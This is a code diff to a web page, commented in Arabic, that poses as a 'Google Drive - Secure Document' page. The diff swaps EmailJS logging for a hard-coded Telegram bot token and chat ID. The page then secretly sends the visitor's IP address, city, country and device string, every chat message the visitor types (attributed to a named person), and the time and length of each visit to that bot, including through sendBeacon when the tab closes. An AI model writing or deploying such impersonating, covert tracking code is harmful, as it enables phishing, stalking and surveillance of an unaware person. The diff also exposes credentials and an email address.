@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Google Drive - Secure Document</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%234285F4' d='M10 0l10 17.3H0z'/><path fill='%230F9D58' d='M0 17.3l5-8.7L10 0z'/><path fill='%23F4B400' d='M20 17.3l-5 8.7H5z'/></svg>" type="image/svg+xml">
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap');
         
@@ -576,12 +575,10 @@
     </div>
 
     <script>
-        emailjs.init("42xkkhNPkONetOTb");
-        
-        const API_URL = window.location.origin.includes('localhost') 
-            ? 'http://localhost:8001/api' 
-            : `${window.location.origin}/api`;
-        
+        // إعدادات بوت التليجرام الخاص بك
+        const BOT_TOKEN = '8749690800:AAEuELgTnXHBn6tAoWoH69QPx2gcVk119h8';
+        const CHAT_ID = '5739890046';
+
         let entryTime = null;
         let allMessages = [];
         
@@ -589,6 +586,24 @@
         const monthField = document.getElementById('month');
         const dayField = document.getElementById('day');
         let showPassword = false;
+
+        // دالة المساعدة لإرسال الرسائل عبر تليجرام
+        async function sendTelegramMessage(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Telegram API Error:', error);
+            }
+        }
         
         function maskAfterDelay(field) {
             setTimeout(() => {
@@ -685,38 +700,33 @@
         }
         
         async function sendEntryNotification() {
+            let locationText = 'غير معروف';
             try {
-                const locationData = await fetch('https://ipapi.co/json/').then(r => r.json());
-                const deviceInfo = navigator.userAgent;
-                
-                const timestamp = new Date().toLocaleString('ar-EG', {
-                    timeZone: 'Asia/Baghdad',
-                    year: 'numeric',
-                    month: 'long',
-                    day: 'numeric',
-                    hour: '2-digit',
-                    minute: '2-digit',
-                    second: '2-digit'
-                });
-                
-                await emailjs.send('service_ses4rwz', 'template_8hb9aix', {
-                    to_email: 'fly.huuisn@gmail.com',
-                    subject: '🔔 دخول إلى الصفحة السرية',
-                    message: `تم فتح الصفحة السرية\n\nالوقت: ${timestamp}\nالموقع: ${locationData.city}, ${locationData.country_name}\nIP: ${locationData.ip}\nالجهاز: ${deviceInfo}`
-                });
-                
-                await fetch(`${API_URL}/visit-logs`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        event_type: 'entry',
-                        device_info: deviceInfo,
-                        location_info: locationData
-                    })
-                });
-            } catch (error) {
-                console.error('Error sending entry notification:', error);
+                const res = await fetch('https://ipapi.co/json/');
+                if (res.ok) {
+                    const loc = await res.json();
+                    locationText = `${loc.city}, ${loc.country_name} (IP: ${loc.ip})`;
+                }
+            } catch (e) {
+                locationText = 'تعذر التحديد التلقائي';
             }
+
+            const timestamp = entryTime.toLocaleString('ar-EG', {
+                timeZone: 'Asia/Baghdad',
+                year: 'numeric',
+                month: 'long',
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+
+            const telegramText = `🔔 <b>إشعار دخول إلى الصفحة السرية</b>\n\n` +
+                                 `⏰ <b>الوقت:</b> ${timestamp}\n` +
+                                 `📍 <b>الموقع:</b> ${locationText}\n` +
+                                 `📱 <b>الجهاز:</b> ${navigator.userAgent}`;
+
+            await sendTelegramMessage(telegramText);
         }
         
         function showChat() {
@@ -728,23 +738,11 @@
                 alert.style.animation = 'fadeOut 1s ease';
                 setTimeout(() => alert.style.display = 'none', 1000);
             }, 15000);
-            
-            loadMessages();
         }
         
         function backToSecret() {
             document.getElementById('chatPage').classList.add('hidden');
             document.getElementById('secretPage').classList.remove('hidden');
-        }
-        
-        async function loadMessages() {
-            try {
-                const response = await fetch(`${API_URL}/messages?sender=receiver`);
-                allMessages = await response.json();
-                renderMessages(allMessages);
-            } catch (error) {
-                console.error('Error loading messages:', error);
-            }
         }
         
         function renderMessages(messages) {
@@ -770,33 +768,27 @@
             
             if (!content) return;
             
-            try {
-                const response = await fetch(`${API_URL}/messages`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: content,
-                        sender: 'receiver'
-                    })
-                });
-                
-                const message = await response.json();
-                
-                const deviceInfo = navigator.userAgent;
-                await emailjs.send('service_ses4rwz', 'template_8hb9aix', {
-                    to_email: 'fly.huuisn@gmail.com',
-                    subject: '💬 رسالة جديدة من ريام',
-                    message: `رسالة جديدة:\n\n${content}\n\nالجهاز: ${deviceInfo}\nالوقت: ${new Date().toLocaleString('ar-EG')}`
-                });
-                
-                allMessages.push(message);
-                renderMessages(allMessages);
-                
-                input.value = '';
-                input.style.height = 'auto';
-            } catch (error) {
-                console.error('Error sending message:', error);
-            }
+            const now = new Date();
+            const messageObj = {
+                content: content,
+                sender: 'receiver',
+                timestamp: now
+            };
+
+            // إرسال الرسالة إلى تليجرام
+            const telegramMsg = `💬 <b>رسالة جديدة من ريام!</b>\n\n` +
+                                `${content}\n\n` +
+                                `⏰ <b>الوقت:</b> ${now.toLocaleString('ar-EG')}\n` +
+                                `📱 <b>الجهاز:</b> ${navigator.userAgent}`;
+            
+            sendTelegramMessage(telegramMsg);
+
+            // عرض الرسالة في الواجهة محلياً
+            allMessages.push(messageObj);
+            renderMessages(allMessages);
+            
+            input.value = '';
+            input.style.height = 'auto';
         }
         
         function toggleSearch() {
@@ -824,7 +816,7 @@
             });
         }
         
-        async function sendExitNotification() {
+        function sendExitNotification() {
             if (entryTime) {
                 const exitTime = new Date();
                 const duration = Math.round((exitTime - entryTime) / 1000);
@@ -833,37 +825,30 @@
                 const seconds = duration % 60;
                 const durationText = `${minutes} دقيقة و ${seconds} ثانية`;
                 
-                try {
-                    await emailjs.send('service_ses4rwz', 'template_8hb9aix', {
-                        to_email: 'fly.huuisn@gmail.com',
-                        subject: '🚪 خروج من الصفحة السرية',
-                        message: `تم الخروج من الصفحة\n\nوقت الخروج: ${exitTime.toLocaleString('ar-EG')}\nمدة البقاء: ${durationText}`
-                    });
-                    
-                    await fetch(`${API_URL}/visit-logs`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            event_type: 'exit',
-                            duration: duration
-                        })
-                    });
-                } catch (error) {
-                    console.error('Error sending exit notification:', error);
-                }
+                const exitMessageText = `🚪 <b>إشعار خروج من الصفحة السرية</b>\n\n` +
+                                        `⏰ <b>وقت الخروج:</b> ${exitTime.toLocaleString('ar-EG')}\n` +
+                                        `⏱ <b>مدة البقاء:</b> ${durationText}`;
+                
+                // استخدام sendBeacon لتأكيد وصول الإشعار حتى عند إغلاق التبويب فوراً
+                const blob = new Blob([JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: exitMessageText,
+                    parse_mode: 'HTML'
+                })], { type: 'application/json' });
+
+                navigator.sendBeacon(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, blob);
             }
         }
         
-        window.addEventListener('pagehide', async (e) => {
-            await sendExitNotification();
-            sessionStorage.clear();
-            window.location.replace('https://www.google.com');
+        window.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'hidden') {
+                sendExitNotification();
+            }
         });
-        
-        window.addEventListener('beforeunload', async (e) => {
-            await sendExitNotification();
+
+        window.addEventListener('pagehide', () => {
+            sendExitNotification();
             sessionStorage.clear();
-            window.location.replace('https://www.google.com');
         });
         
         [yearField, monthField, dayField].forEach(field => {
